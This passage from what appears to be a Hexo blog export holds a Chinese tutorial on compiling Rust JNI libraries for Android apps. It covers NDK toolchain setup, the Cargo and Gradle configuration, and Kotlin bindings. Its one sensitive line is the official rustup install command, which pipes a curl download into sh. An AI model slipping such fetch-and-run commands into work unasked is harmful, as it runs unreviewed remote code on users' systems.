\"rust-android-libs\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html\n\n[dependencies]\njni = { version = \"0.19.0\", default-features = false }\n\n[lib]\ncrate_type = [\"cdylib\"]\n```\n\n这里Rust的JNI版本，可以参考官方文档：[Docs.rs](https://docs.rs/releases/search?query=jni)，目前最新为0.19.0，下面的crate_type配置也是按文档来的。\n\n3、编写Rust代码，在src/lib.rs文件中：\n\n```rust\n#![cfg(target_os = \"android\")]\n#![allow(non_snake_case)]\n\nuse jni::JNIEnv;\nuse jni::objects::{JClass, JString};\nuse jni::sys::jstring;\n\n#[no_mangle]\npub extern \"C\" fn Java_com_xxx_xxx_Yyy_getTestStr(\n    env: JNIEnv, _: JClass,\n) -> jstring {\n    env.new_string(\"Hello World!\")\n        .expect(\"Couldn't create java string!\")\n        .into_inner()\n}\n\n#[no_mangle]\npub extern \"C\" fn Java_com_xxx_xxx_Yyy_getTestStrWithInput(\n    env: JNIEnv, _: JClass, input: JString,\n) -> jstring {\n    let input: String = env.get_string(input)\n        .expect(\"Couldn't get java string!\")\n        .into();\n    let output = env.new_string(format!(\"Hello, {}!\", input))\n        .expect(\"Couldn't create java string!\");\n    output.into_inner()\n}\n```\n\n如上所示，我们编写了两个方法，一个是直接返回一个String，另一个是带参数返回拼接后的String。方法的命名规则和写C++的JNI代码一样，以此处为例，说明我们需要在Java/Kotlin代码中对应创建一个包名为 `com.xxx.xxx`，名为 `Yyy` 的类，其中有两个方法：\n\n```kotlin\npackage com.xxx.xxx\n\nobject Yyy {\n    init {\n        // 因为等会儿编译的so产物为librust_android_libs.so，所以此处加载命名如下\n        System.loadLibrary(\"rust_android_libs\")\n    }\n\n    external fun getTestStr(): String\n    external fun getTestStrWithInput(input: String): String\n}\n```\n\n4、编译Rust项目，按需要的架构编译即可，如果不用模拟器的话，一般都不用考虑x86：\n\n```bash\ncargo build --target aarch64-linux-android --release\ncargo build --target armv7-linux-androideabi --release\ncargo build --target i686-linux-android --release\n```\n\n编译成功后在项目的 `/target/aarch64-linux-android/release/librust_android_libs.so` 路径下可以找到想要的so文件，把它复制到Android项目中。\n\n一般来说都在 `.../app/src/main/jniLibs/arm64-v8a/` 这样的目录下，按你需要的架构来即可。同时记得配置build.gradle：\n\n```groovy\n...\nandroid {\n    compileSdkVersion 30\n    defaultConfig {\n        ...\n\n        ndk {\n            abiFilters 'arm64-v8a'\n        }\n    }\n\n    // 如果你的AGP插件版本不小于7.0，可能需要添加\n    packagingOptions {\n        jniLibs {\n            useLegacyPackaging = true\n        }\n    }\n}\n...\n```\n\n### 后话\n\n整个流程下来，还是有点小繁琐的，同时也整理几个问题吧：\n\n1、同样的代码逻辑，Rust编译出来的so库比C++编译的要大很多，以我上面的代码为例，64位架构大约在**4MB**左右，32位在3MB多一点，而C++编译的产物分别为**1MB**多和900多KB，这对包体积大小敏感的项目来说，差距还是不小的。不知道有没有优化的方法，由于我也是刚接触Rust，还不太了解。\n\n```bash\n# 我们可以用strings命令来对比两种环境编译出来的so结构\nstrings librust_android_libs.so\n```\n\n2、复杂的业务逻辑肯定需要调试，以方便定位问题，但以我们上面的例子来看，Rust项目和Android是分开的，如何像C++代码那样直接在Android项目中整合编译并断点调试，还需要进一步探索。\n\n3、Google和Rust官方对于适配到Android应用项目的相关文档还不是很丰富，我们在Studio中New Project的时候，就可以看见有Native C++的模板可以选择，这给了初学者很好的示范，希望以后也有Native Rust之类的模板。\n","slug":"Rust为Android应用编译so库","published":1,"updated":"2024-03-25T07:31:25.987Z","comments":1,"photos":[],"link":"","_id":"cluaufh1j004mthe6084580vc","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>Rust是个好东西，Google也开始把它用于AOSP了。我们开发应用同样也可以使用Rust来编写原本为C++的Native代码。网上搜罗一圈，入门的文档不多不少，这里稍微归纳整理一下吧，毕竟Hello World是人类的一大步。</p>\n<h3 id=\"安装Rust\"><a href=\"#安装Rust\" class=\"headerlink\" title=\"安装Rust\"></a>安装Rust</h3><p>Rust的文档真的非常棒，目前的翻译版本也几乎满足所有学习需求。安装很简单，参考官网（<a href=\"https://www.rust-lang.org/zh-CN/learn/get-started\">Rust-lang.org</a>）即可，一行命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl --proto <span class=\"string\">&#x27;=https&#x27;</span> --tlsv1.2 -sSf https://sh.rustup.rs | sh</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"配置NDK\"><a href=\"#配置NDK\" class=\"headerlink\" title=\"配置NDK\"></a>配置NDK</h3><p>1、先确保你在Android Studio的SDK Manager中下载安装好了NDK相关的工具包，基操就不赘述了。</p>\n<p>2、默认目录一般都在 <code>/Users/你的用户名/Library/Android/sdk/ndk-bundle</code> 这个位置，用户目录可以用 <code>$&#123;HOME&#125;</code> 代替。当然，如果你的SDK在其他位置，按你的来即可。</p>\n<p>在任意处创建一个名为NDK的目录（名字随意，也可不叫NDK），然后运行NDK工具包中的py脚本以编译NDK开发环境：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ~</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> NDK</span><br><span class=\"line\"><span class=\"comment\"># 不同架构参数不同，按需配置即可，比如我就只需要arm64</span></span><br><span class=\"line\"><span class=\"comment\"># api参数最好按你的应用targetSDK的版本号来，比如我这里是30</span></span><br><span class=\"line\"><span class=\"comment\"># Python版本我这里是3.8，如果你是Python 2.x的话，不确定能否运行成功</span></span><br><span class=\"line\">python <span class=\"variable\">$&#123;HOME&#125;</span>/Library/Android/sdk/ndk-bundle/build/tools/make_standalone_toolchain.py --api 30 --<span class=\"built_in\">arch</span> arm64 --install-dir NDK/arm64</span><br><span class=\"line\">python <span class=\"variable\">$&#123;HOME&#125;</span>/Library/Android/sdk/ndk-bundle/build/tools/make_standalone_toolchain.py --api 30 --<span class=\"built_in\">arch</span> arm --install-dir NDK/arm</span><br><span class=\"line\">python <span class=\"variable\">$&#123;HOME&#125;</span>/Library/Android/sdk/ndk-bundle/build/tools/make_standalone_toolchain.py --api 30 --<span class=\"built_in\">arch</span> x86 --install-dir NDK/x86</span><br></pre></td></tr></table></figure>\n\n<p>3、编辑Rust环境的配置文件即 <code>~/.cargo/config</code> ，若无，新建即可，并添加内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 同样是按需配置，如果你不需要编译其他架构，就不添加</span></span><br><span class=\"line\"><span class=\"comment\"># 相关路径最好写绝对路径，此处若用$&#123;HOME&#125;不生效</span></span><br><span class=\"line\">[target.aarch64-linux-android]</span><br><span class=\"line\">ar = <span class=\"string\">&quot;/Users/你的用户名/NDK/arm64/bin/aarch64-linux-android-ar&quot;</span></span><br><span class=\"line\">linker = <span class=\"string\">&quot;/Users/你的用户名/NDK/arm64/bin/aarch64-linux-android-clang&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">[target.armv7-linux-androideabi]</span><br><span class=\"line\">ar = <span class=\"string\">&quot;/Users/你的用户名/NDK/arm/bin/arm-linux-androideabi-ar&quot;</span></span><br><span class=\"line\">linker = <span class=\"string\">&quot;/Users/你的用户名/NDK/arm/bin/arm-linux-androideabi-clang&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">[target.i686-linux-android]</span><br><span class=\"line\">ar = <span class=\"string\">&quot;/Users/你的用户名/NDK/x86/bin/i686-linux-android-ar&quot;</span></span><br><span class=\"line\">linker = <span class=\"string\">&quot;/Users/你的用户名/NDK/x86/bin/i686-linux-android-clang&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>4、添加编译工具链，和第3步中配置的对应：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rustup target add aarch64-linux-android armv7-linux-androideabi i686-linux-android</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"编写Demo\"><a href=\"#编写Demo\" class=\"headerlink\" title=\"编写Demo\"></a>编写Demo</h3><p>配置好各种环境后，就可以开始Coding了，先生成一个Rust的lib空项目，<code>rust-android-libs</code> 是我的自定义命名：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cargo new rust-android-libs --lib</span><br></pre></td></tr></table></figure>\n\n<p>进入目录，编辑Cargo.toml配置文件，直接修改如下：</p>\n<figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[package]</span></span><br><span class=\"line\"><span class=\"attr\">name</span> = <span class=\"string\">&quot;rust-android-libs&quot;</span></span><br><span class=\"line\"><span class=\"attr\">version</span> = <span class=\"string\">&quot;0.1.0&quot;</span></span><br><span class=\"line\"><span class=\"attr\">edition</span> = <span class=\"string\">&quot;2021&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[dependencies]</span></span><br><span class=\"line\"><span class=\"attr\">jni</span> = &#123; version = <span class=\"string\">&quot;0.19.0&quot;</span>, default-features = <span class=\"literal\">false</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[lib]</span></span><br><span class=\"line\"><span class=\"attr\">crate_type</span> = [<span class=\"string\">&quot;cdylib&quot;</span>]</span><br></pre></td></tr></table></figure>\n\n<p>这里Rust的JNI版本，可以参考官方文档：<a href=\"https://docs.rs/releases/search?query=jni\">Docs.rs</a>，目前最新为0.19.0，下面的crate_type配置也是按文档来的。</p>\n<p>3、编写Rust代码，在src&#x2F;lib.rs文件中：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#![cfg(target_os = <span class=\"string\">&quot;android&quot;</span>)]</span></span><br><span class=\"line\"><span class=\"meta\">#![allow(non_snake_case)]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> jni::JNIEnv;</span><br><span class=\"line\"><span class=\"keyword\">use</span> jni::objects::&#123;JClass, JString&#125;;</span><br><span class=\"line\"><span class=\"keyword\">use</span> jni::sys::jstring;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#[no_mangle]</span></span><br><span class=\"line\"><span class=\"keyword\">pub</span> <span class=\"keyword\">extern</span> <span class=\"string\">&quot;C&quot;</span> <span class=\"keyword\">fn</span> <span class=\"title function_\">Java_com_xxx_xxx_Yyy_getTestStr</span>(</span><br><span class=\"line\">    env: JNIEnv, _: JClass,</span><br><span class=\"line\">) <span class=\"punctuation\">-&gt;</span> jstring &#123;</span><br><span class=\"line\">    env.<span class=\"title function_ invoke__\">new_string</span>(<span class=\"string\">&quot;Hello World!&quot;</span>)</span><br><span class=\"line\">        .<span class=\"title function_ invoke__\">expect</span>(<span class=\"string\">&quot;Couldn&#x27;t create java string!&quot;</span>)</span><br><span class=\"line\">        .<span class=\"title function_ invoke__\">into_inner</span>()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#[no_mangle]</span></span><br><span class=\"line\"><span class=\"keyword\">pub</span> <span class=\"keyword\">extern</span> <span class=\"string\">&quot;C&quot;</span> <span class=\"keyword\">fn</span> <span class=\"title function_\">Java_com_xxx_xxx_Yyy_getTestStrWithInput</span>(</span><br><span class=\"line\">    env: JNIEnv, _: JClass, input: JString,</span><br><span class=\"line\">) <span class=\"punctuation\">-&gt;</span> jstring &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">input</span>: <span class=\"type\">String</span> = env.<span class=\"title function_ invoke__\">get_string</span>(input)</span><br><span class=\"line\">        .<span class=\"title function_ invoke__\">expect</span>(<span class=\"string\">&quot;Couldn&#x27;t get java string!&quot;</span>)</span><br><span class=\"line\">        .<span class=\"title function_ invoke__\">into</span>();</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">output</span> = env.<span class=\"title function_ invoke__\">new_string</span>(<span class=\"built_in\">format!</span>(<span class=\"string\">&quot;Hello, &#123;&#125;!&quot;</span>, input))</span><br><span class=\"line\">        .<span class=\"title function_ invoke__\">expect</span>(<span class=\"string\">&quot;Couldn&#x27;t create java string!&quot;</span>);</span><br><span class=\"line\">    output.<span class=\"title function_ invoke__\">into_inner</span>()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如上所示，我们编写了两个方法，一个是直接返回一个String，另一个是带参数返回拼接后的String。方法的命名规则和写C++的JNI代码一样，以此处为例，说明我们需要在Java&#x2F;Kotlin代码中对应创建一个包名为 <code>com.xxx.xxx</code>，名为 <code>Yyy</code> 的类，其中有两个方法：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.xxx.xxx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">object</span> Yyy &#123;</span><br><span class=\"line\">    <span class=\"keyword\">init</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 因为等会儿编译的so产物为librust_android_libs.so，所以此处加载命名如下</span></span><br><span class=\"line\">        System.loadLibrary(<span class=\"string\">&quot;rust_android_libs&quot;</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">external</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">getTestStr</span><span class=\"params\">()</span></span>: String</span><br><span class=\"line\">    <span class=\"keyword\">external</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">getTestStrWithInput</span><span class=\"params\">(input: <span class=\"type\">String</span>)</span></span>: String</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>4、编译Rust项目，按需要的架构编译即可，如果不用模拟器的话，一般都不用考虑x86：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cargo build --target aarch64-linux-android --release</span><br><span class=\"line\">cargo build --target armv7-linux-androideabi --release</span><br><span class=\"line\">cargo build --target i686-linux-android --release</span><br></pre></td></tr></table></figure>\n\n<p>编译成功后在项目的 <code>/target/aarch64-linux-android/release/librust_android_libs.so</code> 路径下可以找到想要的so文件，把它复制到Android项目中。</p>\n<p>一般来说都在 <code>.../app/src/main/jniLibs/arm64-v8a/</code> 这样的目录下，按你需要的架构来即可。同时记得配置build.gradle：</p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">android &#123;</span><br><span class=\"line\">    compileSdkVersion <span class=\"number\">30</span></span><br><span class=\"line\">    defaultConfig &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\"></span><br><span class=\"line\">        ndk &#123;</span><br><span class=\"line\">            abiFilters <span class=\"string\">&#x27;arm64-v8a&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 如果你的AGP插件版本不小于7.0，可能需要添加</span></span><br><span class=\"line\">    packagingOptions &#123;</span><br><span class=\"line\">        jniLibs &#123;</span><br><span class=\"line\">            useLegacyPackaging = <span class=\"literal\">true</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h3><p>整个流程下来，还是有点小繁琐的，同时也整理几个问题吧：</p>\n<p>1、同样的代码逻辑，Rust编译出来的so库比C++编译的要大很多，以我上面的代码为例，64位架构大约在<strong>4MB</strong>左右，32位在3MB多一点，而C++编译的产物分别为<strong>1MB</strong>多和900多KB，这对包体积大小敏感的项目来说，差距还是不小的。不知道有没有优化的方法，由于我也是刚接触Rust，还不太了解。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 我们可以用strings命令来对比两种环境编译出来的so结构</span></span><br><span class=\"line\">strings librust_android_libs.so</span><br></pre></td></tr></table></figure>\n\n<p>2、复杂的业务逻辑肯定需要调试，以方便定位问题，但以我们上面的例子来看，Rust项目和Android是分开的，如何像C++代码那样直接在Android项目中整合编译并断点调试，还需要进一步探索。</p>\n<p>3、Google和Rust官方对于适配到Android应用项目的相关文档还不是很丰富，我们在Studio中New Project的时候，就可以看见有Native C++的模板可以选择，这给了初学者很好的示范，希望以后也有Native Rust之类的模板。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>Rust是个好东西，Google也开始把它用于AOSP了。我们开发应用同样也可以使用Rust来编写原本为C++的Native代码。网上搜罗一圈，入门的文档不多不少，这里稍微归纳整理一下吧，毕竟Hello World是人类的一大步。</p>\n<h3 id=\"安装Rust\"><a href=\"#安装Rust\" class=\"headerlink\" title=\"安装Rust\"></a>安装Rust</h3><p>Rust的文档真的非常棒，目前的翻译版本也几乎满足所有学习需求。安装很简单，参考官网（<a href=\"https://www.rust-lang.org/zh-CN/learn/get-started\">Rust-lang.org</a>）即可，一行命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl --proto <span class=\"string\">&#x27;=https&#x27;</span> --tlsv1.2 -sSf https://sh.rustup.rs | sh</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"配置NDK\"><a href=\"#配置NDK\" class=\"headerlink\" title=\"配置NDK\"></a>配置NDK</h3><p>1、先确保你在Android Studio的SDK Manager中下载安装好了NDK相关的工具包，基操就不赘述了。</p>\n<p>2、默认目录一般都在 <code>/Users/你的用户名/Library/Android/sdk/ndk-bundle</code> 这个位置，用户目录可以用 <code>$&#123;HOME&#125;</code> 代替。当然，如果你的SDK在其他位置，按你的来即可。</p>\n<p>在任意处创建一个名为NDK的目录（名字随意，也可不叫NDK），然后运行NDK工具包中的py脚本以编译NDK开发环境：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ~</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> NDK</span><br><span class=\"line\"><span class=\"comment\"># 不同架构参数不同，按需配置即可，比如我就只需要arm64</span></span><br><span class=\"line\"><span class=\"comment\"># api参数最好按你的应用targetSDK的版本号来，比如我这里是30</span></span><br><span class=\"line\"><span class=\"comment\"># Python版本我这里是3.8，如果你是Python 2.x的话，不确定能否运行成功</span></span><br><span class=\"line\">python <span class=\"variable\">$&#123;HOME&#125;</span>/Library/Android/sdk/ndk-bundle/build/tools/make_standalone_toolchain.py --api 30 --<span class=\"built_in\">arch</span> arm64 --install-dir NDK/arm64</span><br><span class=\"line\">python <span class=\"variable\">$&#123;HOME&#125;</span>/Library/Android/sdk/ndk-bundle/build/tools/make_standalone_toolchain.py --api 30 --<span class=\"built_in\">arch</span> arm --install-dir NDK/arm</span><br><span class=\"line\">python <span class=\"variable\">$&#123;HOME&#125;</span>/Library/Android/sdk/ndk-bundle/build/tools/make_standalone_toolchain.py --api 30 --<span class=\"built_in\">arch</span> x86 --install-dir NDK/x86</span><br></pre></td></tr></table></figure>\n\n<p>3、编辑Rust环境的配置文件即 <code>~/.cargo/config</code> ，若无，新建即可，并添加内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 同样是按需配置，如果你不需要编译其他架构，就不添加</span></span><br><span class=\"line\"><span class=\"comment\"># 相关路径最好写绝对路径，此处若用$&#123;HOME&#125;不生效</span></span><br><span class=\"line\">[target.aarch64-linux-android]</span><br><span class=\"line\">ar = <span class=\"string\">&quot;/Users/你的用户名/NDK/arm64/bin/aarch64-linux-android-ar&quot;</span></span><br><span class=\"line\">linker = <span class=\"string\">&quot;/Users/你的用户名/NDK/arm64/bin/aarch64-linux-android-clang&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">[target.armv7-linux-androideabi]</span><br><span class=\"line\">ar = <span class=\"string\">&quot;/Users/你的用户名/NDK/arm/bin/arm-linux-androideabi-ar&quot;</span></span><br><span class=\"line\">linker = <span class=\"string\">&quot;/Users/你的用户名/NDK/arm/bin/arm-linux-androideabi-clang&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">[target.i686-linux-android]</span><br><span class=\"line\">ar = <span class=\"string\">&quot;/Users/你的用户名/NDK/x86/bin/i686-linux-android-ar&quot;</span></span><br><span class=\"line\">linker = <span class=\"string\">&quot;/Users/你的用户名/NDK/x86/bin/i686-linux-android-clang&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>4、添加编译工具链，和第3步中配置的对应：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rustup target add aarch64-linux-android armv7-linux-androideabi i686-linux-android</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"编写Demo\"><a href=\"#编写Demo\" class=\"headerlink\" title=\"编写Demo\"></a>编写Demo</h3><p>配置好各种环境后，就可以开始Coding了，先生成一个Rust的lib空项目，<code>rust-android-libs</code> 是我的自定义命名：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cargo new rust-android-libs --lib</span><br></pre></td></tr></table></figure>\n\n<p>进入目录，编辑Cargo.toml配置文件，直接修改如下：</p>\n<figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[package]</span></span><br><span class=\"line\"><span class=\"attr\">name</span> = <span class=\"string\">&quot;rust-android-libs&quot;</span></span><br><span class=\"line\"><span class=\"attr\">version</span> = <span class=\"string\">&quot;0.1.0&quot;</span></span><br><span class=\"line\"><span class=\"attr\">edition</span> = <span class=\"string\">&quot;2021&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[dependencies]</span></span><br><span class=\"line\"><span class=\"attr\">jni</span> = &#123; version = <span class=\"string\">&quot;0.19.0&quot;</span>, default-features = <span class=\"literal\">false</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[lib]</span></span><br><span class=\"line\"><span class=\"attr\">crate_type</span> = [<span class=\"string\">&quot;cdylib&quot;</span>]</span><br></pre></td></tr></table></figure>\n\n<p>这里Rust的JNI版本，可以参考官方文档：<a href=\"https://docs.rs/releases/search?query=jni\">Docs.rs</a>，目前最新为0.19.0，下面的crate_type配置也是按文档来的。</p>\n<p>3、编写Rust代码，在src&#x2F;lib.rs文件中：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#![cfg(target_os = <span class=\"string\">&quot;android&quot;</span>)]</span></span><br><span class=\"line\"><span class=\"meta\">#![allow(non_snake_case)]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> jni::JNIEnv;</span><br><span class=\"line\"><span class=\"keyword\">use</span> jni::objects::&#123;JClass, JString&#125;;</span><br><span class=\"line\"><span class=\"keyword\">use</span> jni::sys::jstring;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#[no_mangle]</span></span><br><span class=\"line\"><span class=\"keyword\">pub</span> <span class=\"keyword\">extern</span> <span class=\"string\">&quot;C&quot;</span> <span class=\"keyword\">fn</span> <span class=\"title function_\">Java_com_xxx_xxx_Yyy_getTestStr</span>(</span><br><span class=\"line\">    env: JNIEnv, _: JClass,</span><br><span class=\"line\">) <span class=\"punctuation\">-&gt;</span> jstring &#123;</span><br><span class=\"line\">    env.<span class=\"title function_ invoke__\">new_string</span>(<span class=\"string\">&quot;Hello World!&quot;</span>)</span><br><span class=\"line\">        .<span class=\"title function_ 